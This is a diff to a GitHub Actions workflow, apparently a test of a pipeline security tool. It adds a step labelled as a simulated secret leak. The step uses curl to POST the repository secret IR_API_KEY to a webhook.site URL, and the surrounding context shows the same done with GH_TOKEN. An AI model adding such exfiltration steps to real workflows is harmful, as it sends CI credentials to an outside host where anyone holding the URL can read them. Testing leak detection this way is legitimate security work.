@@ -35,6 +35,12 @@ jobs:
             -H "Content-Type: application/json" \
             -d "{\"leaked_secret_github_token\": \"${{ secrets.GH_TOKEN }}\"}"
 
+      - name: Simulate secret leak of Ir-api-key via cURL
+        run: |
+          curl -X POST https://webhook.site/3cf43a02-7caa-4d2b-bc40-4cf906e55296 \
+            -H "Content-Type: application/json" \
+            -d "{\"leaked_secret_IR_API_KEY\": \"${{ secrets.IR_API_KEY }}\"}"
+
       - name: Cleanup PSE
         if: always()
         uses: invisirisk/pse-action@dev-test
